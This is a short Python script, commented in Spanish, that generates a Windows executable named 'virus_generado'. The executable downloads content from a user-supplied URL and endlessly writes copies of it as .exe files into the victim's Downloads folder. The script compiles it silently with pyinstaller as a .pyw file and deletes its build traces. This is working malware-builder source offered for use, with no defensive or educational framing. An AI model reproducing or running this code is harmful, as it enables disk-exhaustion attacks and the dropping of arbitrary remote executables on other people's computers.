import argparse, subprocess, os
parser = argparse.ArgumentParser(description='Descarga atomatizada')
parser.add_argument('-l', '--link', required=True, type=str, help='URL')
args = parser.parse_args()
link = args.link
def generar(l):
 code=f'''
import os, requests
user=os.getlogin()
url='{l}';
r=requests.get(url)
n=1
while True:
 with open(f'C:\\\\users\\\\{{user}}\\\\Downloads\\\\download_{{n}}.exe', 'wb') as f:
  f.write(r.content)
  f.close()
 n=n+1
'''
 return code

creado=generar(link)
vg='virus_generado.pyw'
exe=f'{vg[:-3]}exe'
with open(vg, 'w') as f:
 f.write(creado)
 f.close()

if os.path.exists(exe):
 os.remove(exe)


ejecutar=[f'pyinstaller --onefile {vg}', 'rmdir /s /q build', f'del "{vg[:-3]}spec"', f'move dist\\{exe} .', f'del {vg}', 'rmdir dist']
for i in ejecutar:
 subprocess.run(i, shell=True)
